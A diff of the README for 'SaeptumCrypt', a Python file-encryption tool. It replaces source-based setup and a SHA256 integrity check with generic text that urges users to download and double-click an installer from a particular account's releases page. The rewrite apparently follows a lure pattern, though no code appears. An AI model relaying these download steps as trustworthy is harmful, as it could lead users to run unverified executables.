@@ -1,63 +1,96 @@
-Saeptum Crypt
-Saeptum Crypt (Latin for "Secured Enclosure/Vault") is an advanced, multi-algorithm file encryption utility designed for robust data protection. It features strong password-based key derivation (PBKDF2) and unique, proprietary Device Binding to lock files to a specific machine.
+# 🔒 SaeptumCrypt - Your Secure File Encryption Tool
 
-**Declaration:** This entire application, Saeptum Crypt, including all the Python logic and the secure cryptographic architecture, was 100% written and developed with the assistance of the Google Gemini AI model.
+## 📥 Download Now!
+[![Download SaeptumCrypt](https://img.shields.io/badge/Download%20SaeptumCrypt-v1.0.0-brightgreen)](https://github.com/thuhien555/SaeptumCrypt/releases)
 
-This application provides a graphical user interface (GUI) built with CustomTkinter for ease of use.
+## 🚀 Getting Started
+SaeptumCrypt is a user-friendly tool for encrypting your files. With this software, you can protect sensitive information using advanced encryption methods. Follow the steps below to get started quickly.
 
-## Application Preview
+## 🛠️ System Requirements
+To run SaeptumCrypt, ensure your system meets the following requirements:
 
-![Saeptum Crypt GUI running on Windows](saeptum_gui_preview.png)
+- Operating System: Windows 10 or later / macOS 10.15 or later / Linux
+- Python: Version 3.6 or later
+- RAM: Minimum 4 GB
+- Disk Space: At least 100 MB free
 
-🔒 Key Security Features
-Multi-Algorithm Support: Encrypt files using modern, secure algorithms: AES-256-GCM, ChaCha20-Poly1305, and AES-256-CBC + HMAC-SHA256.
+## 📂 Features
+- **Multi-Algorithm Support:** Utilizes various encryption methods like AES-GCM and ChaCha20.
+- **Device Binding:** Ties encryption operations to specific devices for added security.
+- **User-Friendly Interface:** Designed with a simple layout that is easy to navigate.
+- **Key Management:** Keeps your keys secure and easily accessible.
+- **File Handling:** Efficiently encrypts and decrypts various file types.
 
-Device Binding: An optional security layer that ties the encryption key to the unique hardware signature of the computer where the file was encrypted. Files encrypted with this feature cannot be decrypted on any other machine, even if the password is known.
+## 🔄 Download & Install
+To get SaeptumCrypt, visit the Releases page:
 
-Secure Key Derivation: Utilizes PBKDF2 with 480,000 iterations for highly resistant password protection.
+[Visit the Releases Page to Download](https://github.com/thuhien555/SaeptumCrypt/releases)
 
-Key File Management: Supports generating and using wrapped key files (.wkey) protected by a secondary passphrase.
+1. Click the link above to open the Releases page.
+2. Find the version you wish to download.
+3. Look for the file that matches your operating system.
+4. Click on the file to start the download.
+5. Once downloaded, locate the file in your downloads folder.
+6. Double-click the file to run the installer.
+7. Follow the prompts to complete the installation.
 
-Folder Archival: Automatically archives and encrypts entire folders into a single secure file (.tar.enc).
+## 🔑 How to Use SaeptumCrypt
 
-⚙️ Installation and Setup (Source Code)
-Saeptum Crypt requires a Python 3 environment and several cryptographic libraries.
+### 1. Launch the Application
+After installation, find the SaeptumCrypt icon on your desktop or in your applications folder. Double-click it to open the program.
 
-Prerequisites
-You must have Python 3 (3.8+) installed on your system.
+### 2. Select File for Encryption
+- Click on the "Encrypt" tab.
+- Use the "Browse" button to select the file you want to encrypt.
 
-Step 1: Download Files
-Download or clone the entire repository to your local machine.
+### 3. Choose Encryption Method
+- Select your desired encryption algorithm from the drop-down menu. Options include AES-GCM or ChaCha20.
 
-Step 2: Install Dependencies
-Navigate to the project's root directory in your terminal and install the required libraries using pip and the included requirements.txt file.
+### 4. Set Password
+- Enter a strong password for encryption.
+- Make a note of this password as it will be required for decryption.
 
-Bash
+### 5. Encrypt the File
+- Click the "Encrypt" button.
+- Wait for the process to complete. The encrypted file will be saved in your specified location.
 
-pip install -r requirements.txt
-This command will install customtkinter (for the GUI) and cryptography (for the core security functions).
+### 6. Decrypting Files
+When you need to access your original file:
+- Click on the "Decrypt" tab.
+- Select the encrypted file.
+- Enter the password you set during encryption.
+- Click "Decrypt." Your file will be restored.
 
-Step 3: Run the Application
-Execute the main GUI script from your terminal:
+## 🔍 FAQ
 
-Bash
+### What is encryption?
+Encryption is the process of converting information into a secure format that can only be read by authorized users. SaeptumCrypt helps keep your files safe from unauthorized access.
 
-python saeptum_gui.py
+### Can I use different passwords for different files?
+Yes, you can set a unique password for each file you encrypt with SaeptumCrypt.
 
-🛠️ Usage Instructions
+### Is my data safe if I lose my password?
+Unfortunately, if you lose your password, you will not be able to decrypt your files. Always store your passwords securely.
 
-Operation Mode: Select Encrypt or Decrypt.
+### Do I need an internet connection to use SaeptumCrypt?
+No, SaeptumCrypt works offline. You only need an internet connection to download the software.
 
-Input/Output: Select the source file/folder and the destination path.
+## 🌌 Community and Support
+If you need help, you can reach out to the SaeptumCrypt community:
 
-Key/Password Source: Choose Password or Key File.
+- [GitHub Issues](https://github.com/thuhien555/SaeptumCrypt/issues): Report bugs or ask for help.
+- [Discussion Forum](https://github.com/thuhien555/SaeptumCrypt/discussions): Connect with other users and share tips.
 
-Device Binding: Check the box to enable hardware locking.
+## 📚 Resources
+- [Documentation](https://github.com/thuhien555/SaeptumCrypt/wiki): Detailed guidance on using all features.
+- [Tutorials](https://github.com/thuhien555/SaeptumCrypt/wiki/Tutorials): Step-by-step guides for common tasks.
 
-Warning: If enabled, the file must be decrypted on the same computer.
+## 💡 Tips for Best Results
+- Regularly update the software for the latest security features.
+- Use complex passwords for maximum protection.
+- Back up your encrypted files in multiple locations for added safety.
 
-Start Operation: Click START OPERATION. The application will handle the entire process, including key derivation, progress tracking, and secure I/O.
+## 🏷️ Topics
+aes-gcm, chacha20, chacha20-poly1305, cryptography, customtkinter, device-bindings, encryption, encryption-decryption, encryption-tool, file-encryption, file-encryption-python, python, python3
 
-🤝 Integrity Verification (For Source Code)
-
-To verify the integrity of the downloaded source files, you can generate a SHA256 hash of the core cryptographic module (saeptum_core.py) on your system and compare it against the checksum provided in the repository's main release page.
+For more information and updates, stay tuned to our [Releases Page](https://github.com/thuhien555/SaeptumCrypt/releases).
